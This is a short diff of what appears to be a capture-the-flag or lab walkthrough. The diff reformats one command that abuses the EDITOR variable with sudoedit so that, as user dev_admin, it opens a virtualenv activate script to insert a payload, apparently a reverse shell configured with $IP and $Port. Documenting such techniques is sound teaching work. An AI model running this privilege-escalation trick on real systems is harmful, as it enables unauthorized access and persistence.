@@ -391,7 +391,7 @@ Ensure you change the $IP and $Port
 
 Lets insert that payload into the file
 
->command: EDITOR="vi -- /app/venv/bin/activate" sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
+command:```EDITOR="vi -- /app/venv/bin/activate" sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt```
 
 ![image](https://user-images.githubusercontent.com/67879936/224596161-340c81b2-d49a-45ec-8b80-2ae1919a9616.png)
 
